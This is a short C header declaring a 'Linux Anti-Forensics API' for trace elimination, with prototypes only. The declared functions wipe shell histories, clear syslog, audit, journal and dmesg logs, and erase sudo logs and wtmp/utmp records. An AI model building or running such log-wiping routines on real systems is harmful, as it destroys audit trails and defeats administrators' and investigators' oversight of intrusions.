#ifndef JOCKY_LINUX_FORENSICS_H
#define JOCKY_LINUX_FORENSICS_H

/* Linux Anti-Forensics API - Complete trace elimination */

int jocky_linux_wipe_bash_history(void);
int jocky_linux_wipe_zsh_history(void);
int jocky_linux_wipe_shell_history(void);
int jocky_linux_clear_syslog(void);
int jocky_linux_clear_audit_log(void);
int jocky_linux_clear_journal(void);
int jocky_linux_clear_dmesg(void);
int jocky_linux_wipe_tmp(void);
int jocky_linux_wipe_home_cache(void);
int jocky_linux_clear_command_history(void);
int jocky_linux_wipe_sudo_logs(void);
int jocky_linux_wipe_wtmp_utmp(void);
int jocky_linux_cleanup_all_forensics(void);

#endif
